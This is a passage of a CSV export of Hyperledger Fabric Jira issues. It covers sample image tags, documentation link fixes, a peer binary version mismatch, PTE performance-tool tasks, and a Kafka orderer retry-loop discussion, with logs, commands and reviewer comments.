exactly what the problem is.

Please provide more information, with the actual filepathname , or attach the dc files which are faulty. I looked in fabric repo and fabric-samples repo, but do not see any -beta image tags on any dc file.

Also, after editing the dc file, did you clean up, remove and regenerate crypto materials?

Could this be a tester error using incorrectly edited dc file, or pointing to images that do not exist?;;;","11/Jul/17 4:32 AM;denyeart;[~scottz] The docker compose file that still references older beta image is at:

https://github.com/hyperledger/fabric-samples/blob/master/basic-network/docker-compose.yml;;;","11/Jul/17 6:21 AM;scottz;We are still not sure exactly the steps to reproduce this, but Ratnakar reproduced that error when we do not have the correct crypto materials. My earlier question still stands:  ""Also, after editing the dc file, did you clean up, remove and regenerate crypto materials?""

In addition, there is an unmerged fix to change these to rc1: [https://gerrit.hyperledger.org/r/#/c/11205/]

And of course, we may have to change them again, to use the official v1.0 images, once available.

I think we can probably close this.;;;","11/Jul/17 6:26 AM;sujeeban;I have modified the docker-compose files and regenerated the crypto materials and the sample woks with it. Should we add the files necessary to generate the conf to make it easier to maintain ?

I didn't understand what was in the config/creds folder, that's why I haven't posted my changes. What are those files and how can I regenerate those ? Could you help me with it ? (It is the first bug I try to correct)

I'll attach the files I have used to regenrate the conf and modify the dc file. (I based those files on other samples);;;","11/Jul/17 7:05 AM;denyeart;As [~scottz] indicates the crypto errors are likely user error.

The remaining problem then is the reference to beta instead of rc1, which appears to be fixed in FAB-5040 / [https://gerrit.hyperledger.org/r/#/c/11205/.]

[~ChristopherFerris] [~mastersingh24] [~JonathanLevi] is there intent to merge FAB-5040 / CR11205 and/or a plan to update the fabric samples to reference rc2/GA upon next release milestone?

Or better yet, can the old image references in docker compose (e.g. *image: hyperledger/fabric-peer:x86_64-1.0.0-beta*) remove the specific release tag so that we don't have to update it every release milestone, as is done in the /first-network docker compose sample (e.g. *image: hyperledger/fabric-peer*).

The reporter is out of office this week, I'm ok if this bug is closed, assuming there is a plan in place to update the samples for rc2/GA.

 

 

 ;;;","11/Jul/17 7:13 AM;JonathanLevi;Thanks for checking. We will update the samples to use the latest released version, yes. Not a show-stopper, confirmed.
We can leave this item as is.;;;","04/Sep/17 9:53 PM;mastersingh24;The fabric-samples release branch currently works with both v1.0.1 and the latest release v1.0.2.
Closing this one;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Private data - Remaining items (reconciliation, chaincode access control, etc)",FAB-5108,18822,,Epic,In Progress,FAB,Fabric,software,denyeart,,,Highest,,manish-sethi,denyeart,denyeart,30/Jun/17 12:22 AM,01/May/21 3:56 AM,28/Oct/23 3:00 AM,,,,,v1.4.0,,fabric-ledger,,,,,,3,,,,,,,Collection of Features deferred from FAB-1151.,,denyeart,nemoto,nirro,pdina,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-12603,,,,,,,,,,,,,,,,,,,,,,,FAB-1151,,,,FAB-8718,FAB-12995,FAB-17312,,,,,,,,,,,,,,,,,,,,,,,,Reconciliation and chaincode access control done.,See FAB-5093 for reconciliation design.,Reviewed,,Done,ghx-label-1,,"Private data - Remaining items (reconciliation, chaincode access control, etc)",To Do,,,Done,,,,"1|hzy6db:",,,,No,Done,,,,,,,,,,,,"[Nir and Manish to add integration test plan, and collaborate with Rajesh on system test plan. See reconciliation test plan in FAB-5093.]

SVT test prime: Rajesh Lalgowdar",,,,,,denyeart,nemoto,nirro,pdina,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broken link in readthedocs,FAB-5111,18826,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,markparz,jyellick,jyellick,30/Jun/17 3:48 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,02/Jul/17 7:09 PM,v1.0.0-rc1,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,"In the section:

http://hyperledger-fabric.readthedocs.io/en/latest/chaincode4noah.html#installing-chaincode

There is a reference to ""Simple Asset Chaincode"" which links to the wrong (or a broken?) location.  Clicking the link changes the URL, but does not change the page.

> For example, to install the sacc sample chaincode described in section `Simple Asset Chaincode`_ using the CLI, the command would look like the following:

I believe the intended link is to http://hyperledger-fabric.readthedocs.io/en/latest/chaincode4ade.html#simple-asset-chaincode",,jyellick,markparz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6dz:",,,,,,,,,,,,,,,,,,,,,,,jyellick,markparz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Jun/17 4:35 AM;markparz;Indeed [~jyellick] thanks, fixed...

[https://gerrit.hyperledger.org/r/#/c/11263/]

 

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Missing link in readthedocs,FAB-5112,18827,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,markparz,jyellick,jyellick,30/Jun/17 3:51 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,02/Jul/17 7:09 PM,v1.0.0-rc1,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,"In the page at http://hyperledger-fabric.readthedocs.io/en/latest/msp.html there is a sentence.

> For fabric-ca related certificate generation, we refer the reader to the fabric-ca related documentation - Setup/ca-setup.

It is not at all clear where to find this, and appears that it should have been encoded as a link but was not?",,jyellick,markparz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6e7:",,,,,,,,,,,,,,,,,,,,,,,jyellick,markparz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Jun/17 4:48 AM;markparz;[~jyellick] Yup... added the link

https://gerrit.hyperledger.org/r/#/c/11265/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaincode GetState API is documentation is not clear.,FAB-5113,18828,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,jyellick,jyellick,jyellick,30/Jun/17 3:55 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,02/Jul/17 2:05 AM,v1.0.0-rc1,,,v1.0.0,,fabric-peer,,,,,,0,documentation,,,,,,"The documentation for the chaincode interface for {{GetState}} reads as follows:

{noformat}
        // GetState returns the value of the specified `key` from the
        // ledger. Note that GetState doesn't read data from the writeset, which
        // has not been committed to the ledger. In other words, GetState doesn't
        // consider data modified by PutState that has not been committed.
        GetState(key string) ([]byte, error)
{noformat}

As a first time chaincode developer, it's not at all clear what the behavior of this function will be when the key does not exist, and whether this is an error or not.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6ef:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Jun/17 3:59 AM;jyellick;In review via: https://gerrit.hyperledger.org/r/#/c/11257/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
peer binary in tarfile wrong version,FAB-5114,18829,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,ChristopherFerris,ChristopherFerris,30/Jun/17 4:01 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,02/Jul/17 6:54 AM,v1.0.0-rc1,,,v1.0.0,,fabric-build,,,,,,0,,,,,,,"peer binary in the darwin-amd64-v1.0.0-rc1 tarfile is incorrect

cbf$ bin/peer version

2017-06-29 14:37:34.946 EDT [msp] getMspConfig -> WARN 001 Intermediate certs folder not found at [/Users/cbf/dev/go/src/github.com/hyperledger/fabric/sampleconfig/msp/intermediatecerts]. Skipping. [stat /Users/cbf/dev/go/src/github.com/hyperledger/fabric/sampleconfig/msp/intermediatecerts: no such file or directory]

2017-06-29 14:37:34.947 EDT [msp] getMspConfig -> WARN 002 TLS intermediate certs folder not found at [/Users/cbf/dev/go/src/github.com/hyperledger/fabric/sampleconfig/msp/tlsintermediatecerts]. Skipping. [stat /Users/cbf/dev/go/src/github.com/hyperledger/fabric/sampleconfig/msp/tlsintermediatecerts: no such file or directory]

2017-06-29 14:37:34.947 EDT [msp] getMspConfig -> WARN 003 crls folder not found at [/Users/cbf/dev/go/src/github.com/hyperledger/fabric/sampleconfig/msp/crls]. Skipping. [stat /Users/cbf/dev/go/src/github.com/hyperledger/fabric/sampleconfig/msp/crls: no such file or directory]

peer:

 Version: development build

 Go version: go1.7

 OS/Arch: darwin/amd64

 Chaincode:

  Base Image Version: 

  Base Docker Namespace: 

  Base Docker Label: 

  Docker Namepace: 

 

2017-06-29 14:37:34.972 EDT [main] main -> INFO 004 Exiting.....",,ChristopherFerris,muralisr,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6en:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,muralisr,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Jun/17 4:07 AM;rameshthoomu;Checked out to 1.0.0-rc1 tag and did `make dist` on linux-amd64.. observed the same version mismatch on peer binary

 
{code:java}
git checkout tags/v1.0.0-rc1
make dist
cd release/linux-amd64/bin
./peer --version{code}
{code:java}
 peer:
 Version: development build
 Go version: go1.7.5
 OS/Arch: linux/amd64
 Chaincode:
  Base Image Version:
  Base Docker Namespace:
  Base Docker Label:
  Docker Namepace:

2017-06-29 19:05:52.028 UTC [main] main -> INFO 004 Exiting.....
{code}
Checking from where the development build version setting to peer binary..;;;","30/Jun/17 8:30 AM;muralisr;[https://gerrit.hyperledger.org/r/#/c/11279/] has one possible fix. There maybe other ways to fix this.

Needs [~greg.haskins] review and correction if appropriate.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"improve API documents about the ""queryBlockByTxID"" method",FAB-5120,18846,18795,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,shumin1027,shumin1027,shumin1027,30/Jun/17 12:46 PM,23/Jan/20 6:53 AM,28/Oct/23 3:00 AM,23/Jan/20 6:53 AM,v1.0.0,,,,,,,,,,,0,stale-item,,,,,,"Supplement and improve API documents about the ""queryBlockByTxID"" method",,davidkhala,shumin1027,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5087,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6hr:",,,,,,,,,,,,,,,,,,,,,,,davidkhala,shumin1027,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:53 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Environment setup,FAB-5121,18848,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,qiang0723,qiang0723,qiang0723,30/Jun/17 2:21 PM,21/Jul/18 3:55 AM,28/Oct/23 3:00 AM,28/Jul/17 3:46 PM,,,,v1.0.0,,fabric-sdk-py,,,,,,0,SDK-Python,,,,,,"Continuously modify the environment to meet the development and testing requirements. [~tonyyang132]

reference:

1.Images: [https://hub.docker.com/r/yeasy/]

2.docker-compose: [https://github.com/yeasy/docker-compose-files/tree/master/hyperledger/1.0]

Now we can start a network with 1-ca,1-orderer, 1-peer and 1-cli.

Done:
 # add a script to docker-compose-file, enable network start with `create` and `join` done
 # change docker-compose-file name to docker-compose-1-peer.yaml",,baohua,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy6hz:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Jul/17 3:06 PM;baohua;Also, the official e2e example can be a good ref, with several updates recently.;;;","14/Jul/17 12:23 PM;baohua;[~david_dornseifer] has update the images with the official ones.

Let's use that as the future baseline.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Start network with channel operation done,FAB-5122,18849,18848,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,qiang0723,qiang0723,qiang0723,30/Jun/17 2:27 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Jul/17 11:41 AM,,,,,,,,,,,,0,,,,,,,,,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6i7:",,,,,,,,,,,,,,,,,,,,,,,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/17 2:28 PM;qiang0723;# add a script to docker-compose-file, enable network start with `create` and `join` done;;;","04/Jul/17 5:12 PM;qiang0723;https://gerrit.hyperledger.org/r/#/c/11347/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"PTE Join successfully, but the node process still running",FAB-5123,18850,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,wsh_bob,z21921,z21921,30/Jun/17 4:07 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/17 5:40 AM,,,,WON'T FIX,,fabric-tools,,,,,,0,,,,,,,"PTE join successful:

info: [PTE main]: [joinChannel] join Channel R E S P O N S E : [[\{""version"":0,""timestamp"":null,""response"":\{""status"":200,""message"":"""",""payload"":\{""type"":""Buffer"",""data"":[]}},""payload"":\{""type"":""Buffer"",""data"":[]},""endorsement"":null},\{""version"":0,""timestamp"":null,""response"":\{""status"":200,""message"":"""",""payload"":\{""type"":""Buffer"",""data"":[]}},""payload"":\{""type"":""Buffer"",""data"":[]},""endorsement"":null}],null,null]
info: [PTE main]: [joinChannel] Successfully joined peers in (testorgschannel1:PeerOrg2)
info: [PTE main]: [joinChannel] The new channel has been successfully joined on peer 172.16.35.101:6052
info: [PTE main]: [joinChannel] join Channel R E S P O N S E : [[\{""version"":0,""timestamp"":null,""response"":\{""status"":200,""message"":"""",""payload"":\{""type"":""Buffer"",""data"":[]}},""payload"":\{""type"":""Buffer"",""data"":[]},""endorsement"":null},\{""version"":0,""timestamp"":null,""response"":\{""status"":200,""message"":"""",""payload"":\{""type"":""Buffer"",""data"":[]}},""payload"":\{""type"":""Buffer"",""data"":[]},""endorsement"":null}],null,null]
info: [PTE main]: [joinChannel] Successfully joined peers in (testorgschannel1:PeerOrg1)

 

BUT NODE process do not quit:

 

root@order0:~/gopath/src/github.com/hyperledger/fabric-sdk-node/test/v1performance# ps -ef |grep pte
root 103785 1 0 15:01 pts/3 00:00:00 node pte-main.js 0 userInputs/samplecc-chan1-join1.json 1498806081247
root 103786 1 0 15:01 pts/3 00:00:00 node pte-main.js 1 userInputs/samplecc-chan1-join2.json 1498806081247
root 103818 66854 0 15:03 pts/3 00:00:00 grep --color=auto pte",,kchristidis,z21921,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6if:",,,,,,,,,,,,,,,,,,,,,,,kchristidis,z21921,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Jul/17 5:14 AM;kchristidis;Please provide a detailed description of what you're doing (a precise list of steps), what you expect, and what you get instead. Logs are good (in fact, logs are necessary) *but logs alone are not enough*.;;;","10/Jul/17 5:40 AM;kchristidis;No update in more than a week, closing. Please re-open with appropriate level of detail if the issue is still relevant.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add crypto for orderer/peer/user incrementally in existing crypto-config which generated by cryptogen,FAB-5124,18851,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,fengfeng,fengfeng,fengfeng,30/Jun/17 4:18 PM,23/Jan/20 6:53 AM,28/Oct/23 3:00 AM,23/Jan/20 6:53 AM,,,,Future,,fabric-crypto,fabric-tools,,,,,0,cryptogen,stale-item,,,,,"Currently the cryptogen tools can only support to generate all the crypto files from the specific crypto-config.yaml which contains all the pre-defined Orgs, Orderers, Peers and Users.

If we want to dynamically add a new orderer/peer/user in a blockchain network, we need to generate the crypto files firstly.

So the cryptogen tools should support to generate crypto files for a new orderer/peer/user and the certificate signed by existing root certificate.",,denyeart,elli-androulaki,fengfeng,qiang0723,sykesm,wutongtree,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy6in:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,elli-androulaki,fengfeng,qiang0723,sykesm,wutongtree,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Mar/18 8:29 PM;elli-androulaki;Hi [~fengfeng], what is the status of this? Should we move this to a later release?;;;","23/Mar/18 2:07 PM;denyeart;Many issues were bulk moved from v1.0 or v1.1 to v1.2 as part of a cleanup effort, and many of these issues are not high priority or actually intended to be worked for v1.2.  This issue is being bulk moved to Future.  If the issue is indeed high priority for v1.2 and/or very low effort, please move back to v1.2 and add a comment to indicate rationale.;;;","23/Jan/20 6:53 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
creating channel always time out when using kafka consensus,FAB-5125,18852,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Done,hongquan.zhang,hongquan.zhang,hongquan.zhang,30/Jun/17 4:46 PM,21/Jul/18 3:54 AM,28/Oct/23 3:00 AM,10/Jul/17 5:56 AM,v1.0.0-rc1,,,WON'T FIX,,fabric-orderer,,,,,,0,kafka,,,,,,"when using kafka consensus mode, we can not create channel due to time out problem when we try the Fabric example e2e_cli.

reproduce steps:
 # change ordererType from solo to kafka in configtx.yaml of Faric example e2e_cli (fabric/examples/e2e_cli)
 # start up test environment by docker-compose
 # execute script.sh under scripts folder
 # The script always failed to create channel due to time out or service unavailable message

After I dig into the source code of orderer, I found that there's a problem in function retryProcess::try.

in this function, we must wait for tickInterval.C before executing target function, this lead to useless time waiting for the first try. It shall try first and wait a while for next retry.

 
{code:java}
// the bug is located in fabric source code file: fabric/orderer/kafka/retry.go
func (rp *retryProcess) try(interval, total time.Duration) error {
    // ... some code removed
    tickInterval := time.NewTicker(interval)
    tickTotal := time.NewTicker(total)
    defer tickTotal.Stop()
    defer tickInterval.Stop()
    logger.Debugf(""[channel: %s] Retrying every %s for a total of %s"", rp.channel.topic(), interval.String(), total.String())

    for {
        select {
        case <-rp.exit:
            exitErr := fmt.Errorf(""[channel: %s] process asked to exit"", rp.channel.topic())
            logger.Warning(exitErr.Error()) // Log it at the warning level
            return exitErr
        case <-tickTotal.C:
            return err
        case <-tickInterval.C:
            logger.Debugf(""[channel: %s] ""+rp.msg, rp.channel.topic())
            if err = rp.fn(); err == nil {
                logger.Debugf(""[channel: %s] Error is nil, breaking the retry loop"", rp.channel.topic())
                return err
            }
        }
    }
}

{code}
 

 ","Ubuntu Linux 16.04

The Fabric 1.0.0 rc1 release and the latest codes in master branch ",hongquan.zhang,kchristidis,stevexiao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,7200,7200,,0%,7200,7200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy6iv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,hongquan.zhang,kchristidis,stevexiao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Jul/17 5:22 AM;kchristidis;{quote}in this function, we must wait for tickInterval.C before executing target function, this lead to useless time waiting for the first try. It shall try first and wait a while for next retry.
{quote}
We _could_ try first before waiting — and in fact if you want to submit a patch for this I will gladly consider it — but in fact, it's the opposite; It would be useless to attempt to connect right away. Provisioning of resources from the Kafka cluster is not instantaneous. If anything, the acceptable time delays in the E2E CLI will need to be adjusted accordingly.

I will also note that you can adjust the amount of time the orderer waits before retrying: [https://github.com/hyperledger/fabric/blob/master/sampleconfig/orderer.yaml#L163]

-I will close this as it's not a bug. If you wish to submit a patch for the retry function, feel free to reopen as an improvement along with the required changeset.-

I noticed that you have assigned this to yourself. Do you intend to submit a changeset for the retry function?;;;","10/Jul/17 5:55 AM;kchristidis;More than a week w/o an update. Will close this. Feel free to reopen when you have the required changeset.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE calculates aggregate TPS from all threads,FAB-5126,18853,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sunhwei,wsh_bob,wsh_bob,30/Jun/17 6:59 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Nov/17 12:06 AM,,,,,,fabric-quality,,,,,,1,,,,,,,"Currently, PTE doesn't provide a TPS summary by end of measurement",,wsh_bob,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzy6j3:",,,,,,,,,,,,,,,,,,,,,,,wsh_bob,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE completed message,FAB-5127,18854,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,wsh_bob,wsh_bob,30/Jun/17 7:09 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,19/Oct/17 11:02 PM,,,,,,fabric-quality,,,,,,0,,,,,,,Need an message to indicate PTE completed (all the PTE process exit),,wsh_bob,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzy6jb:",,,,,,,,,,,,,,,,,,,,,,,wsh_bob,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/